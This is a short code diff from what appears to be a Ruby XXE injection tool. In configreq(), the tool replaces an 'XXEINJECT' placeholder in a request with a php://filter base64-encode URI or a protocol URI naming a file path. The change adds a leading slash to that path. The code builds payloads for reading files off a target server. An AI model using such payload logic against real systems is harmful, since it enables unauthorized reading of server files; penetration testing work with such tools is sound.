@@ -384,7 +384,7 @@ def configreq()
 			tline = CGI.unescape(postline).gsub("+", " ")
 			if tline.include?("XXEINJECT") && $xslt == "n"
 				if $direct != "" && $phpfilter == "y"
-                    postline = postline.sub("XXEINJECT", "php://filter/read=convert.base64-encode/resource=#{$directpath}")
+                    postline = postline.sub("XXEINJECT", "php://filter/read=convert.base64-encode/resource=/#{$directpath}")
 					found = found + 1
 				elsif $direct != ""
 					postline = postline.sub("XXEINJECT", $rproto + ":///#{$directpath}")
